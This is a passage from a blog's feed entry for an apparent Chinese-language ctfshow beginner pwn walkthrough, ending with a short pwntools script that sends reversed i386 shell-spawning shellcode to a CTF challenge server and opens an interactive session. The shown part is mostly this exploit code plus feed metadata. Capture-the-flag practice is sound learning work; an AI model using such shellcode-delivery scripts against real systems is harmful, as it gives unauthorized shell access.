plaintext">from pwn import*<br>context.arch=&#x27;i386&#x27;<br>io=remote(&#x27;pwn.challenge.ctf.show&#x27;,28220)<br><br>shellcode=asm(shellcraft.sh())[::-1]<br>io.send(shellcode)<br><br>io.interactive()<br><br></code></pre></td></tr></table></figure>]]>
    </content>
    <id>http://example.com/2025/08/24/ctfshow-pwn%E5%85%A5%E9%97%A8/</id>
    <link href="http://example.com/2025/08/24/ctfshow-pwn%E5%85%A5%E9%97%A8/"/>
    <published>2025-08-24T05:30:19.048Z</published>
    <summary>
      <![CDATA[<h1 id="Test-your-nc"><a href="#Test-your-nc" class="headerlink" title="Test_your_nc"></a>Test_your_nc</h1><h2 id="pwn0"><a href="#pwn0" cla]]>
    </summary>
    <title>ctfshow-pwn入门</title>
    <updated>2025-11-26T04:05:58.270Z</updated>
  </entry>
</feed>
